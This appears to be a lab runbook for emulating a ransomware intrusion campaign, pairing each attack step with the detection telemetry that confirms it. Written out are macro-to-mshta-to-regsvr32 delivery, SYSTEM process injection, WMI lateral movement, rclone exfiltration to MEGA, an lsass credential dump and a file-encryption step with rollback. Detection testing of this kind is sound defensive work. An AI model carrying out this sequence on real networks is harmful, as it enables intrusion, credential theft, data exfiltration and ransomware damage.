# Run order

The sequence follows the campaign. Each step lists the observable that confirms it before the next
step starts.

## 0. Preconditions

| Check | Command | Expected |
|---|---|---|
| Snapshots | hypervisor | one snapshot per host, named for the run |
| Sysmon | `sysmon64 -c infra\sysmon\sysmon-c0015-balanced.xml` | events 1, 3, 7, 8, 10, 11, 22 present |
| DNS | `nslookup five.azureedge.net` on WS01 | 192.168.50.100 |
| DNS negative | `nslookup volga.azureedge.net` on WS01 | non-existent domain |
| MEGA remote | `rclone lsd Mega:` on FS01 | lists the remote |
| Staging | `curl http://192.168.50.1:8000/PowerView.ps1` | 200 |

## 1. Delivery and proxy execution

1. Copy the delivery archive to the victim desktop and open the document, enabling macros.
2. The macro writes `compareforfor.hta` and starts it through `cmd.exe /c mshta`.
3. The HTA downloads `compareForfor.jpg` to `C:\Users\Public` and calls `regsvr32` with that path.
4. The module registers its callback.

Confirm: `WINWORD.EXE -> cmd.exe -> mshta.exe -> regsvr32.exe` in process creation, and the unsigned
module load from `C:\Users\Public`.

## 2. Stage hosting

1. `install_stage_service.ps1` creates the service and starts it.
2. `svchost.exe -k c0015grp` spawns `rundll32.exe C:\Users\Public\C0015\D8B3.dll`.
3. The beacon registers; the fallback module produces failed lookups for the unresolved name.

Confirm: `svchost.exe -> rundll32.exe`, the unsigned module hash, and repeated `QueryStatus 9003`.

## 3. Injection into winlogon

1. From the rundll32 session, `migrate --process-name winlogon.exe`.
2. Select the new session and confirm `whoami` returns `nt authority\system`.
3. Run one command and confirm the parent image in process creation.

Confirm: thread creation into `winlogon.exe`, and a child process whose parent is `winlogon.exe`.

## 4. Discovery

1. Run `discovery-runbook.ps1` from the winlogon session.
2. Run `invoke-sharefinder.ps1` and confirm `C:\ProgramData\found_shares.txt`.

Confirm: one `cmd.exe` per command with `winlogon.exe` as parent, and the enumeration file.

## 5. Lateral movement to the backup server

1. Stage `143.dll` to `\\FS01\C$\ProgramData\143.dll`.
2. Run the pivot: `wmic /node:FS01 process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"`.
3. Confirm `WmiPrvSE.exe -> rundll32.exe` on FS01 and the new session.

Confirm: the provider-host edge, the unsigned module load on the target, and the callback from FS01.

## 6. Injection into the service host

1. Find the PID of `svchost.exe -k UnistackSvcGroup -s CDPUserSvc`.
2. `migrate --pid <pid>`.
3. Confirm the callback originates from `svchost.exe`.

## 7. Interactive access

1. `socks5 start`, then connect the RDP client through the proxy.
2. Open the backup console; start Task Manager from the Start menu.
3. Confirm `taskmgr.exe /4` with `explorer.exe` as parent.

## 8. Exfiltration, round 1

1. `rclone-exfil.ps1 -Source \\FS01\Shares -Round 1`.
2. Confirm the process command line, the egress connection, and the remote listing.

## 9. Second round and remote access

1. On the next run day, repeat the transfer with `--ignore-existing`.
2. Place AnyDesk in the user Videos directory and start it.
3. Place ProcessHacker at `C:\`, dump `lsass.exe`, parse the dump offline.

## 10. Impact and restore

1. `run-impact.ps1 -Action Prepare` to copy and hash the corpus.
2. `run-impact.ps1 -Action Run` to execute `locker.bat` from the backup server.
3. `run-impact.ps1 -Action Verify` to count notes and renamed files.
4. `run-impact.ps1 -Action Rollback` and confirm the hash comparison passes.
5. Remove the staged binaries, the service, the dump, and the MEGA object.
